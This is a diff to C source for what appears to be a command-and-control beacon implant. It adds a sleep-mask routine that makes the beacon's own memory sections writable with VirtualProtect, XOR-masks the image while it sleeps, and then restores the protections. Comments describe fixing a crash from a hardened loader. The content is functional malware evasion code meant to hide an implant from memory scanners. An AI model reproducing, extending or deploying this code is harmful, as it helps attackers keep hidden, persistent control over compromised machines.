@@ -914,11 +914,48 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					 * the own-PE table or the mask walk lands on our
 					 * .pdata and fail-fasts (see docs/SLEEP-MASK-FEEDBACK.md) */
 					gargle_own_sections(gparms, NULL, NULL);
+					/* The official kit technique XORs the image in place.
+					 * The official loader maps the beacon RWX so every
+					 * masked page is writable; our hardened loader leaves
+					 * the header page and .text/.rdata RX/R, and the first
+					 * mask_section write to beacon_ptr faulted (0xC0000005
+					 * WRITE at the image base, kit_sm.dmp forensics:
+					 * crash rip in mask_section's xor [r11+r9] loop with
+					 * r11=beacon_ptr). Flip each own-table range RW for
+					 * the kit window and restore the original protections
+					 * when the technique returns. */
+					{
+						struct { char * addr; SIZE_T size; DWORD oldp; } flip[36];
+						int nflips = 0, fi;
+						DWORD * walk = gparms->sections;
+						DWORD oldp = 0;
+						while (walk != NULL && nflips < 36) {
+							DWORD a = walk[0], b = walk[1];
+							if (a == 0 && b == 0)
+								break;
+							if (b > a && gparms->beacon_ptr != NULL &&
+									VirtualProtect(gparms->beacon_ptr + a,
+									               (SIZE_T)(b - a),
+									               PAGE_READWRITE, &oldp)) {
+								flip[nflips].addr = gparms->beacon_ptr + a;
+								flip[nflips].size = (SIZE_T)(b - a);
+								flip[nflips].oldp = oldp;
+								nflips++;
+							}
+							walk += 2;
+						}
+						if (gparms == NULL)
+							Sleep(t);
+						else
+							((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
+						for (fi = 0; fi < nflips; fi++) {
+							DWORD oldp2 = 0;
+							VirtualProtect(flip[fi].addr, flip[fi].size, flip[fi].oldp, &oldp2);
+						}
+					}
 				}
-				if (gparms == NULL)
-					Sleep(t);
 				else
-					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
+					Sleep(t);
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
 			}
 			else {
